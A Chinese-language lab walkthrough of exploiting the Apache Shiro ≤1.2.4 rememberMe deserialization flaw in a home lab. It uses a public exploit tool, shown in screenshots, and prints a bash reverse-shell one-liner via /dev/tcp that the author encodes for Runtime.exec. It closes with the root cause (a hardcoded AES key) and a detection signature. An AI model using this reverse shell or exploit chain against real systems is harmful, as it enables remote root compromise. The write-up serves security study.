### 1.环境搭建

实验靶机：CentOS7（192.168.2.102）

攻击机：Kali-Linux（192.168.2.101）

在CentOS7开启docker容器：

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225125629.png)

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225125823.png)

浏览器登录192.168.2.102:8080

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225125911.png)

### 2.漏洞利用

影响版本：Apache Shiro <= 1.2.4

下载shiro反序列化工具：

[Release ShiroExploit v2.3 · feihong-cs/ShiroExploit-Deprecated (github.com)](https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.3)

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225130039.png)

填入靶机地址：

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225130509.png)

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225130522.png)

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225130908.png)

对kali的9999端口进行监听：

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225130939.png)

点击执行：

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225131031.png)

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225131215.png)

可以看到shell反弹成功，获取root权限



利用的的反弹shell：

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

放到网站上进行加密[java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)](https://www.jackson-t.ca/runtime-exec-payloads.html)

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211225173540.png)

### 3.漏洞分析

漏洞原因：

Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 > Base64解码–>AES解密–>反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。

漏洞特征：

shiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段
